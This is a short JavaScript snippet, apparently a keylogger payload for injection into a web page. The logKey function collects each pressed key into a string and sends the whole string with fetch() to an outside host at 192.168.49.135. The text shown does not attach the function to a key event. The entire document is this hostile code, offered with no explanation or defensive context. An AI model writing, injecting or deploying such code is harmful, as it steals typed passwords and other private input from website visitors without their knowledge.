var keys = '';
function logKey(event){
  keys += event.key
  fetch('http://192.168.49.135/k?key=' + keys);
}
